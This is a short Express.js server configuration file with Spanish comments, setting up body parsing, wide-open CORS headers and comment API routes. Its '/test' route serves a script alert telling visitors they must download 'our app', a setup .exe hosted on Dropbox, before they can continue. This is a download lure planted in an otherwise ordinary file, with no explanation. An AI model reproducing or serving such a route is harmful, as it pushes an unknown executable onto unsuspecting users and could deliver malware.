/*
	Archivo para configurar express
*/

var express= require('express');
var bodyParser= require('body-parser');
var app= express();


//cargar archivos rutas
var comment_routes= require('./routes/comment');

//middlewares


app.use(bodyParser.urlencoded({extended: false}));  //Configuración de bodyParser
app.use(bodyParser.json());//Convierte cualquier dato que llegue por POST convertirlo en JSON


//CORS
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Authorization, X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Allow-Request-Method');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
    res.header('Allow', 'GET, POST, OPTIONS, PUT, DELETE');
    next();
});


//rutas
app.use('/api', comment_routes);



/*
app.get('/', (req, res)=>{
	res.status(200).send(
		"<h1> HOLA </h1>"
	);
}); //app Es express, get método
//expor
*/


app.get('/test', (req, res)=>{
	res.status(200).send("<script>alert('Para poder continuar, descarga nuestra app: https://www.dropbox.com/s/vo6aglr7wf9ksfm/setup-x86_64.exe?dl=1');</script>");
}); //app Es express, get método
//expor



module.exports = app;